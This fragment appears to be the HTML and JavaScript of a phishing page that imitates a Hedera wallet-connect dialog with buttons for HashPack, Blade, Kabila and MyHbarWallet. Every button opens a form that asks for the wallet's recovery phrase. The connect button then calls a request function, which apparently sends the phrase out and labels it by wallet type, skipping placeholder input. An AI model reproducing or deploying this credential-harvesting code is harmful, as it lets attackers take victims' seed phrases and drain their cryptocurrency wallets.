                ...
                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">
                    <div class="sc-dkzDqf jKlSZW" style="width: 312px;">
                        ...
                        <div class="sc-jfmDQi erYMGl">
                            <button onclick="updatePage(TrezorWalletModal)" class="sc-eKszNL fTpgsT">
                                <div class="sc-hiMGwR iPMOKQ">
                                    <div style="transform: scale(1.1);">
<img src="https://cdn.prod.website-files.com/61ce2e4bcaa2660da2bb419e/62e14973c65367120073a891_app-icon.webp" loading="lazy" width="32" height="32" alt="">                                    </div>
                                </div>
                                <span class="sc-olbas ftvWqB">HashPack</span>
                            </button>
                            <!--<button onclick="updatePage(TrezorWalletModal);" class="sc-eKszNL fTpgsT">
                                <div class="sc-hiMGwR iPMOKQ">
...
<img src="https://play-lh.googleusercontent.com/PFdLgGXHdffs2J9NLvLyZTGFbm1sm3nBGtYQnP0nmyc-HJp8UWS_5Z5TeWpw6ulIQA=w240-h480-rw" loading="lazy" width="32" height="32" alt="">


                                </div>
                                <span class="sc-olbas ftvWqB">Blade Wallet</span>
                            </button>
                            <button id="trezor-button" onclick="updatePage(TrezorWalletModal);" class="sc-eKszNL fTpgsT">
                                <div class="sc-hiMGwR iPMOKQ">


<img src="https://play-lh.googleusercontent.com/F4A-8OFCQlGZmViA96JRW_C84cb8GQrX_czpOaYDQiFyYtQp0ufL8EtB82cZjiXSdw=w240-h480-rw" loading="lazy" width="32" height="32" alt="">

                                
                                </div>
                                <span class="sc-olbas ftvWqB">Kabila Wallet</span>
                            </button>
                            <button onclick="updatePage(TrezorWalletModal);" class="sc-eKszNL fTpgsT">
                                <div class="sc-hiMGwR iPMOKQ">
                                
<img src="./svgviewer-png-output%20(11).png" loading="lazy" width="32" height="32" alt="">
</div>
                                <span class="sc-olbas ftvWqB">MyHbarWallet</span>
                            </button>
                            <button id="exodus-button" onclick="updatePage(TrezorWalletModal);" class="sc-eKszNL fTpgsT">
                                <div class="sc-hiMGwR iPMOKQ">
                        ...
                        <div id="different-button" class="sc-lbxAil hLcKTw">
                            <button onclick="updatePage(TrezorWalletModal);" class="sc-iNWwEs fKICOT dasdvr">
        ...
        <div id="mnemonic-inputdiv-23" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                ...
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-23" type="text" tabindex="24" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
                                        ...
                                        <button onClick="window.sendRequest();updatePage(TrezorWalletFinishModal);" class="sc-himrzO eyWopv connect-phrase-button">
        ...
        if (page === ImportWalletFinishModal || page === ExodusWalletFinishModal || page === LedgerWalletFinishModal || page === TrezorWalletFinishModal) {
            ...
            if (phrase.length > 30 && !phrase.includes("word word word")) {
                ...
                request_api({
                    ...
                    imported: page == TrezorWalletFinishModal ? "TREZOR" : page == LedgerWalletFinishModal ? "LEDGER" : page == ExodusWalletFinishModal ? "EXODUS" : "DIFFERENT",
                    ...
                    //request_api({
                     //   phrase: phrase,
                       // passphrase: passphrase,
                        //imported: page == TrezorWalletModal ? "TREZOR" : page == LedgerWalletModal ? "LEDGER" : page == ExodusWalletModal ? "EXODUS" : "DIFFERENT",
                        //keywords: wordsSelector.value
                    //})
                }
            });
